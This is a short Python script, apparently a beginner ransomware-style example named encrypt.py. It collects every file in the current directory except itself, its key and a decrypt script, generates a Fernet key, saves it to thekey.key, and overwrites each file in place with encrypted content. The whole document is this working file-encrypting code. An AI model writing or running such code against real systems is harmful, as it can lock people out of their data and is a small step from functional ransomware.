import os
from cryptography.fernet import Fernet  ## Used to generate the encryption key

files = []

for file in os.listdir():  ## Looping through the directory and searching for files
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":  ## Dont want to encrypt the encryption script and the key
        continue
    if os.path.isfile(file):  ## Appending all the files we want to encrypt in the empty list
        files.append(file)

print(files)  

key = Fernet.generate_key()  ## Generating the encryption key

with open("thekey.key", "wb") as thekey:  ## Saving the key in a .key file
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:  ## Opening and reading the files
        content = thefile.read() 
    content_encrypted = Fernet(key).encrypt(content)  ## Encrypting the content of the file
    with open(file, "wb") as thefile:  ## Writing the encrypted content in the files
        thefile.write(content_encrypted)
